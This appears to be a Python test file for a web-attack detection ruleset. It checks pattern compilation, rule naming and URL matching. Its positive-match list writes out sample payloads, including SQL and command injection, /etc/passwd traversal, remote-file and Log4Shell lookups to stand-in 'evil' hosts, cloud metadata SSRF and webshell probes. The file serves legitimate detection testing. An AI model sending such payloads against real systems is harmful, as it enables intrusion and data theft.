"""Validate the detection ruleset: dialect contract, compilation, and matching.

Runnable directly (`python tests/test_rules.py`) or via pytest.
"""
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.analysis import rules  # noqa: E402

# Lucene regexp (flags=ALL) operators that must never appear UNescaped as
# literals in a pattern (they would silently change ES-side matching).
_FORBIDDEN = re.compile(r'(?<!\\)[<>#&@~"{}]')


def test_dialect_contract():
    """No pattern may contain an unescaped Lucene-special literal."""
    for name, _sev, pattern, _desc in rules.SIGNATURES:
        bad = _FORBIDDEN.findall(pattern)
        assert not bad, f"rule '{name}' has unescaped Lucene-special char(s): {bad}"


def test_patterns_compile():
    for name, _sev, pattern, _desc in rules.SIGNATURES:
        try:
            re.compile(pattern, re.IGNORECASE)
        except re.error as exc:
            raise AssertionError(f"rule '{name}' does not compile: {exc}")


def test_unique_names_and_valid_severity():
    names = [s[0] for s in rules.SIGNATURES]
    assert len(names) == len(set(names)), "duplicate rule names"
    for name, sev, _p, _d in rules.SIGNATURES:
        assert sev in ("low", "medium", "high", "critical"), f"{name}: bad severity {sev}"


# (payload, expected rule name) — one representative true-positive per category
POSITIVES = [
    ("/p?id=1%27%20or%201=1--+", "sqli"),
    ("/api/user?filter[$ne]=1", "nosqli"),
    ("/ping?host=127.0.0.1;whoami/", "command_injection"),
    ("/cgi?x=() { :;}; echo", "shellshock"),
    ("/page?name={{7*7}}", "ssti"),
    ("/search?q=*)(uid=*", "ldap_injection"),
    ("/x?q=<script>alert(1)</script>", "xss"),
    ("/download?file=../../../../etc/passwd", "lfi_traversal"),
    ("/load?page=http://evil.example/shell.txt", "rfi"),
    ("/fetch?url=http://169.254.169.254/latest/meta-data", "ssrf"),
    ("/import?data=<!ENTITY xxe SYSTEM %22file:///etc/passwd%22>", "xxe"),
    ("/api?o=O:8:%22stdClass%22", "deserialization"),
    ("/uploads/shell.php?cmd=whoami", "webshell"),
    ("/x?p=${jndi:ldap://evil/a}", "log4shell"),
    ("/path?class.module.classLoader.resources=1", "spring4shell"),
    ("/struts.action?redirect:${(new)}", "struts_ognl"),
    ("/?next=%0d%0aSet-Cookie:x", "crlf_injection"),
    ("/login?redirect=//evil.example", "open_redirect"),
    ("/..;/manager/html", "access_bypass"),
    ("/.git/config", "sensitive_file"),
    ("/download?f=file.php%00.jpg", "null_byte"),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "cve_probe"),
    ("/trace.axd", "iis_aspnet"),
]

NEGATIVES = [
    "/",
    "/index.html",
    "/products?id=42&page=2&sort=price",
    "/static/css/main.min.css",
    "/api/v1/orders/1001",
    "/images/logo.png",
    "/blog/2026/07/a-normal-post-title",
    "/search?q=laptop+bag",
]


def test_positive_matches():
    for payload, expected in POSITIVES:
        tags = rules.tag_url(payload)
        assert expected in tags, f"{payload!r} → {tags}, expected {expected!r}"


def test_negatives_are_clean():
    for url in NEGATIVES:
        tags = rules.tag_url(url)
        assert tags == [], f"false positive on {url!r}: {tags}"


def test_scanner_ua():
    assert rules.is_scanner_ua("sqlmap/1.7#stable")
    assert rules.is_scanner_ua("Mozilla/5.0 (compatible; Nuclei)")
    assert not rules.is_scanner_ua(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in fns:
        fn()
        print(f"PASS {fn.__name__}")
    print(f"\nAll {len(fns)} rule tests passed — {len(rules.SIGNATURES)} signatures, "
          f"{len(rules.SCANNER_UAS)} scanner UAs.")
